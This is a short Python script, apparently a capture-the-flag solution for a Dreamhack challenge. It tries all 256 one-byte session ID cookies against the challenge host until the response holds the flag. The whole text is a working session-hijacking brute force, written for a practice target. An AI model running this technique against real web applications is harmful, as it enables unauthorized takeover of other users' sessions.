
from requests import get

URL = "http://host1.dreamhack.games:20082/"


for i in range(256):
    session_id = i.to_bytes(1, 'big').hex()
    cookies = {
        'sessionid': session_id
    }
    r = get(URL, cookies=cookies)
    if 'DH{' in r.text:
        print(r.text)
        break
